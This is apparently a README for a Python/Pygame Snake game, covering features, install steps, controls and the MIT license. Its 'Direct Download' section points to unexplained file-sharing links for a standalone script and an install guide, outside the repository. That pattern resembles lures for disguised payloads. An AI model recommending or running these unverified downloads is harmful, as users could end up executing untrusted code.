# Snake Game

A classic Snake game built with Python and Pygame. Control a snake to collect apples, grow longer, and avoid collisions with yourself. Features colorful graphics, smooth controls, and a polished game experience.

## Features

- **Classic Snake gameplay**: Collect apples to grow longer and increase your score
- **Colorful graphics**: Visually appealing snake with gradient body and animated eyes
- **Smooth controls**: Responsive arrow key controls with anti-180-degree turn prevention
- **Score tracking**: Real-time score display with length counter
- **Game over screen**: Clean overlay with restart options
- **Grid visualization**: Background grid for better spatial awareness
- **Cross-platform**: Works on Linux, Windows, and macOS with Python/Pygame

## Installation

### Prerequisites
- Python 3.6 or higher
- Pygame library

### Installation Steps

1. **Clone the repository:**
   ```bash
   git clone https://github.com/yourusername/snake-game.git
   cd snake-game
   ```

2. **Install Pygame:**
   ```bash
   pip install pygame
   ```

3. **Run the game:**
   ```bash
   python snake_game.py
   ```

### Alternative: Direct Download
You can also download the standalone Python script from:
- **Python Script**: https://bin.mikoshi.de/file/divorce-direct-soldier
- **Installation Guide**: https://bin.mikoshi.de/file/cash-child-ripple

## Usage

1. Launch the game by running `python snake_game.py`
2. Use arrow keys to control the snake's direction
3. Collect red apples to grow longer and increase your score
4. Avoid colliding with yourself
5. When game over occurs, press SPACE to restart or ESC to quit

## Controls

- **Arrow Up**: Move snake upward
- **Arrow Down**: Move snake downward  
- **Arrow Left**: Move snake left
- **Arrow Right**: Move snake right
- **SPACE**: Restart game (when game over)
- **ESC**: Quit game (when game over or during gameplay via window close)

### Game Mechanics
- Each apple collected adds 10 points to your score
- The snake grows by one segment for each apple collected
- The game ends if the snake collides with itself
- The snake wraps around screen edges (toroidal world)

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2024 Snake Game Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Project Structure

```
snake-game/
├── snake_game.py      # Main game implementation
├── README.md          # This documentation file
└── LICENSE            # MIT License file
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## Acknowledgments

- Built with [Pygame](https://www.pygame.org/)
- Inspired by the classic Nokia Snake game
- Thanks to all contributors and testers